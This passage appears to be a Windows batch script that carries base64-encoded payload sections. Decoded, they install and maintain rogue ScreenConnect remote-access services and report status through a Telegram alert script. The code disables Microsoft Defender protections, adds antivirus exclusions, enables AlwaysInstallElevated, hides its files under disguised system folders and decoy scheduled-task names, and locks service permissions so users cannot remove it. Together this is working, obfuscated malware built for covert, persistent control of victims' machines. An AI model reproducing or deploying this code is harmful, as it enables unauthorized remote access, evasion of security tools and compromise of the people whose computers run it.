b25uZWN0IENsaWVudCAoJX4xKSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAxIGV4aXQg
L2IgMA0KaWYgbm90IGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBleGl0IC9iIDENCnBvd2Vyc2hl
bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJX4xIiAtV29ya0RpciAi
JVdEJSIgPj4iJUxPRyUiIDI+JjENCmNhbGwgOldhaXRTdmMNCmV4aXQgL2IgMA0KDQo6UmVzdG9y
ZUFsdA0KcmVtIEFMVCBzZXJ2aWNlIGdvbmUgYnV0IHN0aWxsIHJlZ2lzdGVyZWQgKFNDLWZhbWls
eSBtc2lleGVjIHNpZGUgZWZmZWN0KSAtIHJlcGFpciBpdCB0b28uDQpzYyBxdWVyeSAiU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAx
IGV4aXQgL2IgMA0KZWNobyBhbHQgbWlzc2luZyAtIHJlcGFpciBhdHRlbXB0Pj4iJUxPRyUiDQpp
ZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRl
cmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIg
LUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAy
PiYxDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJS
VU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiQUxUX09LPTEiDQpleGl0IC9i
IDANCg0KOk5vTXNpUG9saWN5DQpyZWcgZGVsZXRlICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1p
Y3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvZiA+bnVsIDI+JjENCnJl
ZyBkZWxldGUgIkhLQ1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFs
bGVyIiAvdiBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQ
b2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IERpc2FibGVNU0kgL3QgUkVH
X0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpleGl0IC9iIDANCg0KOldhaXRTdmMNCnNldCAiVFJJ
RVM9MCINCjpXYWl0TG9vcA0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9G
UCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBzZXQg
IklOU1RBTExFRD0xIg0KICBzZXQgIlBSSU1fT0s9MSINCiAgZXhpdCAvYiAwDQopDQpzZXQgL2Eg
VFJJRVMrPTENCmlmICVUUklFUyUgR0VRIDEwIGV4aXQgL2IgMQ0KcGluZyAxMjcuMC4wLjEgLW4g
NyA+bnVsIDI+JjENCmdvdG8gOldhaXRMb29wDQoNCjpUZ1N0YXRlDQpzZXQgIk5FV1NUQVRFPSV+
MSINCnNldCAiTVNHPSV+MiINCnNldCAiT0xEU1RBVEU9Ig0KaWYgZXhpc3QgIiVTVEFURSUiIHNl
dCAvcCBPTERTVEFURT08IiVTVEFURSUiDQpyZW0gZmFsc2UgRE9XTiBhZnRlciByZWJvb3QgcmFj
ZTogcHJpbWFyeSBhbHJlYWR5IFJ1bm5pbmcg4oCUIGRvIG5vdCBzcGFtDQppZiAvSSAiJU5FV1NU
QVRFJSI9PSJET1dOIiAoDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBf
RlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAg
IGVjaG8gdGdfc2tpcF9kb3duX2FscmVhZHlfcnVubmluZz4+IiVMT0clIg0KICAgIGV4aXQgL2Ig
MA0KICApDQopDQpyZW0gcmF0ZS1saW1pdCByZXBlYXRlZCBET1dOL0ZBSUw6IG1heCAxIGFsZXJ0
IHBlciA2aCB3aGlsZSBzdHVjaw0KaWYgL0kgIiVORVdTVEFURSUiPT0iRE9XTiIgZ290byA6TWF5
YmVTdXBwcmVzcw0KaWYgL0kgIiVORVdTVEFURSUiPT0iRkFJTCIgZ290byA6TWF5YmVTdXBwcmVz
cw0KZ290byA6U2VuZEFsZXJ0DQo6TWF5YmVTdXBwcmVzcw0KaWYgL0kgIiVORVdTVEFURSUiPT0i
JU9MRFNUQVRFJSIgaWYgZXhpc3QgIiVXRCVcdGdfc2VudC5mbGFnIiAoDQogIHBvd2Vyc2hlbGwg
LU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChOZXctVGltZVNwYW4gLVN0
YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVXRCVcdGdfc2VudC5mbGFnJykuTGFzdFdyaXRl
VGltZSkuVG90YWxNaW51dGVzIC1sdCAzNjApe2V4aXQgMH1lbHNle2V4aXQgMX0iID5udWwgMj4m
MQ0KICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIHRnX3N1cHByZXNzZWRfJU5FV1NU
QVRFJT4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopDQo6U2VuZEFsZXJ0DQplY2hvICVO
RVdTVEFURSU+IiVTVEFURSUiDQplY2hvIHNlbnQ+IiVXRCVcdGdfc2VudC5mbGFnIg0KcG93ZXJz
aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAt
RmlsZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAtU3RhdGUgJU5FV1NUQVRFJSAtU3VtbWFyeSAiJU1T
RyUiIC1CdWlsZCAlTU9OVkVSJSAtQ291bnQgJUNPVU5UJSA+bnVsIDI+JjENCmVjaG8gdGcgc3Rh
dGUgJU5FV1NUQVRFJSBzZW50Pj4iJUxPRyUiDQpleGl0IC9iIDANCg==
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM5IC0gZHluYW1pYyBncnl4
YSBGUCBmcm9tIGdyeXhhLmNmZzsgTk8gTG9ja0RpciBvbiBTQyBkaXJzDQpzZXRsb2NhbCBFbmFi
bGVFeHRlbnNpb25zIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NCnNldCAiV0Q9JVByb2dyYW1EYXRh
JVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSINCnNldCAiV0QyPSVQcm9ncmFt
RGF0YSVcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiDQpzZXQgIkxPRz0lV0Ql
XGJvb3QuZXJyIg0Kc2V0ICJQUklNPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJl
NTA3KSINCnNldCAiQUxUPVNjcmVlbkNvbm5lY3QgQ2xpZW50IChmODYxYzgxNDBkNDUzNDI3KSIN
CnNldCAiS0VFUDE9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiS0VFUDI9Zjg2MWM4MTQwZDQ1MzQy
NyINCnNldCAiS0VFUDM9OTkwODE5OGU2NjhlNDc1MCINCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNm
ZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdy
eXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVOVF9GUCIgc2V0ICJLRUVQMz0lJUwiDQpz
ZXQgIkdSWVhBPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCnNldCAiUEY9JVByb2dy
YW1GaWxlcyUiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiVEFTS1JPT1Q9
JVN5c3RlbVJvb3QlXFN5c3RlbTMyXFRhc2tzIg0KDQppZiBub3QgZXhpc3QgIiVXRCUiIG1rZGly
ICIlV0QlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEMiUiIG1rZGlyICIlV0QyJSIgPm51
bCAyPiYxDQplY2hvIHNlY3VyZV9iZWdpbiAlREFURSUgJVRJTUUlIFM5Pj4iJUxPRyUiDQoNClJF
TSAtLS0gTmV1dHJhbGl6ZSBNU0kgYmxvY2sgcG9saWNpZXMgKDE2MjUpIC0tLQ0KUkVNIERpc2Fi
bGVNU0k6IDA9YWxsb3csIDE9bm9uLWFkbWluIG9ubHksIDI9YWxsIC0+IGZvcmNlIDANCnJlZyBh
ZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
diBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtM
TVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IEFsd2F5
c0luc3RhbGxFbGV2YXRlZCAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBkZWxl
dGUgIkhLQ1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAv
diBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtDVVxTT0ZUV0FSRVxQb2xpY2ll
c1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IEFsd2F5c0luc3RhbGxFbGV2YXRlZCAv
dCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCg0KUkVNIC0tLSBEZWZlbmRlcjogcmVnaXN0
cnkgZXhjbHVzaW9ucyAocG9saWN5ICsgcHJlZmVyZW5jZSBrZXlzKSAtLS0NCnJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXIiIC92IERpc2Fi
bGVBbnRpU3B5d2FyZSAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1l
IFByb3RlY3Rpb24iIC92IERpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9k
IDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
dFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlQmVoYXZp
b3JNb25pdG9yaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtM
TVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUg
UHJvdGVjdGlvbiIgL3YgRGlzYWJsZUlPQVZQcm90ZWN0aW9uIC90IFJFR19EV09SRCAvZCAxIC9m
ID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2lu
ZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVNjcmlwdFNjYW5u
aW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVdEJSIg
L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1p
Y3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlV0QyJSIgL3Qg
UkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jv
c29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICJDOlxXaW5kb3dzXFRl
bXAiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVRFTVAl
IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+
JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhj
bHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIiAv
dCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWlj
cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQMyUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVz
aW9uc1xQYXRocyIgL3YgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90
IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNy
b3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYx
DQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMyUpIiAv
dCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMuZXhlIGN1
cmwuZXhlIGNtZC5leGUgcG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNvbm5lY3Qu
Q2xpZW50U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkgZG8gKA0K
ICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
CikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2VyIHRoYW4g
cmVnIGFsb25lKSAtLS0NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZl
IC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZlcmVuY2UgLURp
c2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVC
ZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJv
dGVjdGlvbiAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0
cnVlfUNhdGNoe307IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2luZG93c1xU
ZW1wJywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVBG
JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSknLCclUEY4NiVcU2NyZWVuQ29ubmVjdCBD
bGllbnQgKCVLRUVQMSUpJywnJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKScp
OyIgXg0KICAidHJ5eyRwYXRocys9QChHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJvZ3JhbUZp
bGVzIC1GaWx0ZXIgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEgMCB8IEZv
ckVhY2gtT2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBmODY9W0Vu
dmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRwZjg2KXsk
cGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5Db25uZWN0
IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9
KX19Y2F0Y2h7fTsiIF4NCiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1PYmplY3Qg
LVVuaXF1ZSkpeyBpZigkcCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSl7IEFkZC1N
cFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVBIDAgfSB9OyIgXg0KICAiZm9yZWFjaCgk
eCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhl
JywnY2VydHV0aWwuZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1NjcmVl
bkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lv
blByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvbkV4
dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxDQoNClJFTSAtLS0g
QUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAtLS0NCmNh
bGwgOkxvY2tEaXIgIiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0tLSBoaWRl
IHdvcmtkaXJzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVXRCUiID5u
dWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6IGRvIE5PVCBo
aWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0gY29weS9tb3ZlIG92ZXIgK2gg
K3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBhbmQgZnJvemUgdGhlIHdob2xlIGZsZWV0J3Mg
c2VsZi11cGRhdGUuIEhpZGRlbiBkaXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4NCmZvciAl
JUYgaW4gKHBrZy5tc2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikgZG8gKA0K
ICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwgMj4mMQ0K
KQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJkZXIgdG8gZGVsZXRlIHdp
dGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBjb250YWluIHNwYWNlcyAoIlNlcnZlciBE
aWFnbm9zdGljcyIpIC0gdGhlIGNtZCBGT1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50byBnYXJi
YWdlIHRva2Vucy4gUG93ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkgaW5zdGVh
ZC4NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Q
b2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9J1NpbGVu
dGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYoVGVzdC1QYXRoIC1MaXRlcmFsUGF0
aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXGlk
ZW50aXR5LmNmZycgLUZvcmNlIHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2ggJ15UQVNL
X1tBLURdPSguKykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0YXJ0KCdc
JykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnV2VyUXVldWVTeW5jJywnUGxhU2VydmVy
SGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25mbGljdFJlcycpIH07IiBeDQogICJmb3Jl
YWNoKCRuIGluICRuYW1lcyl7ICRmID0gSm9pbi1QYXRoICclVEFTS1JPT1QlJyAkbjsgaWYoVGVz
dC1QYXRoIC1MaXRlcmFsUGF0aCAkZil7ICYgaWNhY2xzLmV4ZSAkZiAvaW5oZXJpdGFuY2U6ciB8
IE91dC1OdWxsOyAmIGljYWNscy5leGUgJGYgL2dyYW50OnIgJ05UIEFVVEhPUklUWVxTWVNURU06
RicgJ0JVSUxUSU5cQWRtaW5pc3RyYXRvcnM6RicgfCBPdXQtTnVsbDsgJiBhdHRyaWIuZXhlICto
ICtzICRmIHwgT3V0LU51bGwgfSB9IiA+bnVsIDI+JjENCg0KUkVNIC0tLSBBQ0w6IFdNSSB3YXRj
aGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIpIC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9v
dCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06
RiIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBkbyBOT1QgTG9ja0RpciBTY3JlZW5Db25uZWN0
IGluc3RhbGwgZGlycyAtLS0NClJFTSB0YWtlb3duK3N0cmlwIG9uIGxpdmUgU0MgZGlycyBicmVh
a3MgY2xpZW50IGZpbGUgd3JpdGVzL3VwZGF0ZXMg4oaSIHBhbmVsIE9GRkxJTkUNClJFTSB3aGls
ZSBzZXJ2aWNlIHN0aWxsIGxvb2tzIFJ1bm5pbmcuIERlZmVuZGVyIGV4Y2x1c2lvbnMgKyBzZXJ2
aWNlIFNEIGFyZSBlbm91Z2guDQpSRU0gTzM3OiBvbmUtc2hvdCB1bmxvY2sgaWYgYSBwcmlvciBi
dWlsZCBMb2NrRGlyJ2QgdGhlc2UgcGF0aHMuDQppZiBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxh
ZyIgKA0KICBmaW5kc3RyIC9DOiJzY19ub2xvY2tfZGlycyIgIiVXRCVcc2VjdXJlX3NjLmZsYWci
ID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gc2NfdW5sb2NrX3ByaW9y
X2xvY2tkaXI+PiIlTE9HJSINCiAgICBmb3IgJSVEIGluICgNCiAgICAgICIlUEYlXFNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglS0VFUDIlKSINCiAgICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIN
CiAgICAgICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICAgIiVQ
Rjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICAgICAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICApIGRvICgNCiAgICAgIGlmIGV4aXN0ICIl
JX5EIiAoDQogICAgICAgIHRha2Vvd24gL0YgIiUlfkQiIC9SIC9EIFkgPm51bCAyPiYxDQogICAg
ICAgIGljYWNscyAiJSV+RCIgL3Jlc2V0IC9UIC9DIC9RID5udWwgMj4mMQ0KICAgICAgICBpY2Fj
bHMgIiUlfkQiIC9ncmFudCAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElO
XEFkbWluaXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQogICAgICApDQogICAgKQ0KICAg
IGVjaG8gc2Nfbm9sb2NrX2RpcnM+JVdEJVxzZWN1cmVfc2MuZmxhZw0KICApDQopIGVsc2UgKA0K
ICBlY2hvIHNjX25vbG9ja19kaXJzPiVXRCVcc2VjdXJlX3NjLmZsYWcNCikNCg0KUkVNIC0tLSBT
QyBzZXJ2aWNlczogU1lTVEVNIGNhbiBjb25maWcvc3RvcC9kZWxldGU7IEJBIGZ1bGw7IHVzZXJz
IGJsb2NrZWQgLS0tDQpSRU0gU1k6IENDIERDIExDIFNXIFJQIERUIExPIFJDICAobm8gU0QgLT4g
Y2Fubm90IGNoYW5nZSB0aGlzIFNEIGl0c2VsZikNCnNldCAiU0Q9RDooQTs7Q0NEQ0xDU1dSUFdQ
RFRMT0NSUkM7OztTWSkoQTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5l
eGUgc2RzZXQgIiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxUJSIg
IiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlR1JZWEElIiAiJVNEJSIgPm51bCAyPiYx
DQpzYy5leGUgY29uZmlnICIlUFJJTSUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhlIGNv
bmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUdSWVhB
JSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0g
ODY0MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAg
Pm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSBy
ZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCnNjLmV4
ZSBmYWlsdXJlICIlR1JZWEElIiByZXNldD0gODY0MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9y
ZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAgPm51bCAyPiYxDQoNCmVjaG8gc2VjdXJlX2RvbmU+
PiIlTE9HJSINCmV4aXQgL2IgMA0KDQo6TG9ja0Rpcg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBleGlz
dCAiJVQlIiBleGl0IC9iIDANClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGluaGVyaXRl
